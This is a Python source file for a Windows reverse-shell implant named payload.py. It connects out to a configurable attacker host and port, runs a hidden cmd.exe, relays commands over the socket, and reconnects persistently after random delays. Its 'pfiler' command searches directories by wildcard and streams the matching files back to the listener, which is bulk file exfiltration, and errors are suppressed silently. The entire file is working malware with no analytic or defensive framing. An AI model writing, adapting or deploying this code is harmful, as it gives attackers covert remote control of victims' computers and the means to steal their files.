# payload.py
# The Heartbeat Soul, reborn with the power of unbreakable protocol.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib
import fnmatch
import struct
import json

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

# --- STATE CONTROL ---
pfiler_active = threading.Event()
# ---------------------

def send_msg(sock, data):
    """Wraps data with a 4-byte length header and sends it."""
    try:
        msg = struct.pack('>I', len(data)) + data
        sock.sendall(msg)
    except:
        pass # Fail silently if the connection is dead

def recv_msg(sock):
    """Receives a 4-byte length header and then the exact amount of data."""
    try:
        raw_msglen = sock.recv(4)
        if not raw_msglen: return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        
        data = b''
        while len(data) < msglen:
            packet = sock.recv(msglen - len(data))
            if not packet:
                return None
            data += packet
        return data
    except:
        return None

def calculate_sha256(file_path):
    """Calculates the SHA256 hash of a file."""
    sha256 = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            for block in iter(lambda: f.read(4096), b''):
                sha256.update(block)
        return sha256.hexdigest()
    except:
        return None

def find_files(start_path, patterns):
    """Recursively finds files matching a list of patterns."""
    found_files = []
    for root, _, files in os.walk(start_path):
        for pattern in patterns:
            for filename in fnmatch.filter(files, pattern):
                full_path = os.path.join(root, filename)
                if os.access(full_path, os.R_OK):
                    found_files.append(full_path)
    return found_files

def handle_pfiler_command(s_obj, command):
    """Handles the logic for 'pfiler' using the new non-blocking protocol."""
    pfiler_active.set() # SILENCE THE SHELL OUTPUT PIPE
    try:
        parts = command.strip().split()
        if len(parts) < 2:
            return 

        # Determine path and patterns
        patterns_and_path = parts[1:]
        potential_path = patterns_and_path[0]
        
        # NOTE: The command parsing must be robust. If the first part is a wildcard,
        # os.path.isdir will fail, and it will default to the current path.
        search_path = os.getcwd()
        patterns = patterns_and_path
        
        if os.path.isdir(potential_path) and not fnmatch.fnmatch(potential_path, '*'):
            search_path = potential_path
            patterns = patterns_and_path[1:]
            if not patterns: patterns = ['*']
        
        # If the first part is a full file path (no wildcard, not a directory), 
        # find_files will still work by setting patterns to the file name.

        files_to_send = find_files(search_path, patterns)
        
        if not files_to_send:
            completion_data = {
                'type': 'transfer_complete',
                'message': f"No files found matching patterns: {patterns} in {search_path}"
            }
            send_msg(s_obj, json.dumps(completion_data).encode('utf-8'))
            return

        for file_path in files_to_send:
            try:
                # Use the search path as the relative root
                relative_path = os.path.relpath(file_path, search_path)
                file_size = os.path.getsize(file_path)
                file_hash = calculate_sha256(file_path)

                if not file_hash: continue

                # Send file header as a JSON control message
                header_data = {
                    'type': 'file_header',
                    'path': relative_path,
                    'size': file_size,
                    'hash': file_hash
                }
                send_msg(s_obj, json.dumps(header_data).encode('utf-8'))
                
                # Send the file content in chunks, each framed
                with open(file_path, 'rb') as f:
                    while True:
                        chunk = f.read(1024 * 1024) # 1MB chunks
                        if not chunk:
                            break
                        send_msg(s_obj, chunk)
                
                # Wait for acknowledgment from listener
                ack_msg = recv_msg(s_obj)
                if not ack_msg:
                    # Connection likely died, abort transfer
                    return

            except Exception:
                # Silently skip files that can't be processed
                continue
    finally:
        # Signal the end of the entire transfer operation
        completion_data = {'type': 'transfer_complete', 'message': 'Pfiler operation finished.'}
        send_msg(s_obj, json.dumps(completion_data).encode('utf-8'))
        pfiler_active.clear() # RESTORE THE SHELL OUTPUT PIPE

def run_conduit():
    """Main reverse shell loop, now with perfect state synchronization."""
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            p = subprocess.Popen(
                ["cmd.exe"],
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                creationflags=0x08000000, # Hides the window
                cwd=os.environ.get("USERPROFILE", "C:\\") # Start in user's home directory
            )
            
            stop_event = threading.Event()

            def pipe_stream(stream, sock):
                while not stop_event.is_set():
                    try:
                        # ONLY SEND IF PFILER IS NOT ACTIVE, THUS PREVENTING DATA COLLISION
                        if not pfiler_active.is_set():
                            data = stream.read(1)
                            if data:
                                sock.sendall(data)
                            else:
                                break
                        else:
                            # Still read the stream to prevent the pipe from blocking the shell
                            stream.read(1) 
                            time.sleep(0.01)
                    except:
                        break

            threading.Thread(target=pipe_stream, args=(p.stdout, s_obj), daemon=True).start()
            threading.Thread(target=pipe_stream, args=(p.stderr, s_obj), daemon=True).start()
            
            while not stop_event.is_set():
                try:
                    data = s_obj.recv(1024)
                    if not data: break
                    
                    command_str = data.decode('utf-8', errors='ignore').strip()

                    if command_str.lower().startswith('pfiler '):
                        # Run the file transfer logic in a separate thread to not block the shell
                        pfiler_thread = threading.Thread(target=handle_pfiler_command, args=(s_obj, command_str), daemon=True)
                        pfiler_thread.start()
                    elif command_str.lower().startswith('cd '):
                        # Keep Python's CWD in sync with the shell
                        try:
                            target_dir = data.decode('utf-8', errors='ignore').strip()[3:]
                            os.chdir(target_dir)
                        except Exception:
                            pass
                        p.stdin.write(data)
                        p.stdin.flush()
                    else:
                        p.stdin.write(data)
                        p.stdin.flush()

                except:
                    break
            
            stop_event.set()
            p.terminate()
            s_obj.close()

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()